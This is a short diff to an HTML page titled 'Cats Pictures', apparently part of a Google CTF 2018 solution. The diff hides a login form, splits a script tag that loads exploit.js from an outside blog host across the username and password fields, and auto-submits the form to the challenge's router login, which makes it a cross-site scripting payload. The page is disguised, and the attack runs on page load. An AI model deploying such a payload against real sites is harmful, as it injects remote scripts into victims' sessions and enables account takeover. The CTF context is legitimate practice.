@@ -4,7 +4,7 @@
     <title>Cats Pictures</title>
 </head>
 <body>
-    <form method="POST" action="https://router-ui.web.ctfcompetition.com/login">
+    <form method="POST" action="https://router-ui.web.ctfcompetition.com/login" style="display: none;">
         <input name="username" />
         <input name="password" />
     </form>
@@ -12,7 +12,8 @@
         const form = document.querySelector("form");
         const [user, pass] = form.querySelectorAll("input");
         user.value = "<script src='https:";
-        pass.value = "";
+        pass.value = "blog.jspenguin.com/other/Google_CTF_2018_2/exploit.js'><\/script>";
+        form.submit();
     </script>
 </body>
 </html>
